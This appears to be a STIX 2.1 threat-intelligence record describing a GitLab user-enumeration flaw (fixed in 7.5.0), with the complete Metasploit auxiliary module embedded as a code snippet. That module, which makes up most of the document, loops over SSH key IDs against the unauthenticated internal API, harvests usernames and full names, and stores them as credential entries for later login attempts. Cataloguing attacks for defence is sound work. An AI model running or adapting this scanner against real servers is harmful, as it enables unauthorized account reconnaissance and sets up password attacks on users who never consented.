{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae40aea3-944e-403e-ae6c-3b214e360d13",
    "created": "2024-08-14T16:30:46.935282Z",
    "modified": "2024-08-14T16:30:46.935286Z",
    "name": "GitLab User Enumeration",
    "description": "\" The GitLab 'internal' API is exposed unauthenticated on GitLab. This allows the username for each SSH Key ID number to be retrieved. Users who do not have an SSH Key cannot be enumerated in this fashion. LDAP users, e.g. Active Directory users will also be returned. This issue was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0. \"",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/gitlab_user_enum.rb",
            "external_id": "gitlab_user_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/archive/gitlab-user-enumeration/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'GitLab User Enumeration',\n      'Description'    => \"\n        The GitLab 'internal' API is exposed unauthenticated on GitLab. This\n        allows the username for each SSH Key ID number to be retrieved. Users\n        who do not have an SSH Key cannot be enumerated in this fashion. LDAP\n        users, e.g. Active Directory users will also be returned. This issue\n        was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0.\n      \",\n      'Author'         => 'Ben Campbell',\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-11-21',\n      'References'     =>\n        [\n          ['URL', 'https://labs.f-secure.com/archive/gitlab-user-enumeration/']\n        ]\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Path to GitLab instance', '/']),\n        OptInt.new('START_ID', [true, 'ID number to start from', 0]),\n        OptInt.new('END_ID', [true, 'ID number to enumerate up to', 50])\n      ])\n  end\n\n  def run_host(_ip)\n    internal_api = '/api/v3/internal'\n    check = normalize_uri(target_uri.path, internal_api, 'check')\n\n    print_status('Sending GitLab version request...')\n    res = send_request_cgi(\n        'uri' => check\n    )\n\n    if res && res.code == 200 && res.body\n      begin\n        version = JSON.parse(res.body)\n      rescue JSON::ParserError\n        fail_with(Failure::Unknown, 'Failed to parse banner version from JSON')\n      end\n\n      git_version = version['gitlab_version']\n      git_revision = version['gitlab_rev']\n      print_good(\"GitLab version: #{git_version} revision: #{git_revision}\")\n\n      service = report_service(\n        host: rhost,\n        port: rport,\n        name: (ssl ? 'https' : 'http'),\n        proto: 'tcp'\n      )\n\n      report_web_site(\n        host: rhost,\n        port: rport,\n        ssl: ssl,\n        info: \"GitLab Version - #{git_version}\"\n      )\n    elsif res && res.code == 401\n      fail_with(Failure::NotVulnerable, 'Unable to retrieve GitLab version...')\n    else\n      fail_with(Failure::Unknown, 'Unable to retrieve GitLab version...')\n    end\n\n    discover = normalize_uri(target_uri.path, internal_api, 'discover')\n\n    users = ''\n    print_status(\"Enumerating user keys #{datastore['START_ID']}-#{datastore['END_ID']}...\")\n    datastore['START_ID'].upto(datastore['END_ID']) do |id|\n      res = send_request_cgi(\n          'uri'       => discover,\n          'method'    => 'GET',\n          'vars_get'  => { 'key_id' => id }\n        )\n\n      if res && res.code == 200 && res.body\n        begin\n          user = JSON.parse(res.body)\n          username = user['username']\n          unless username.nil? || username.to_s.empty?\n            print_good(\"Key-ID: #{id} Username: #{username} Name: #{user['name']}\")\n            store_username(username, res)\n            users << \"#{username}\\n\"\n          end\n        rescue JSON::ParserError\n          print_error(\"Key-ID: #{id} - Unexpected response body: #{res.body}\")\n        end\n      elsif res\n        vprint_status(\"Key-ID: #{id} not found\")\n      else\n        print_error('Connection timed out...')\n      end\n    end\n\n    unless users.nil? || users.to_s.empty?\n      store_userlist(users, service)\n    end\n  end\n\n  def store_userlist(users, service)\n    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'GitLab Users', service)\n    print_good(\"Userlist stored at #{loot}\")\n  end\n\n  def store_username(username, res)\n    service = ssl ? 'https' : 'http'\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: service,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id,\n      proof: res\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: username\n    }\n\n    credential_data.merge!(service_data)\n\n    # Create the Metasploit::Credential::Core object\n    credential_core = create_credential(credential_data)\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }\n\n    # Merge in the service data and create our Login\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-21"
}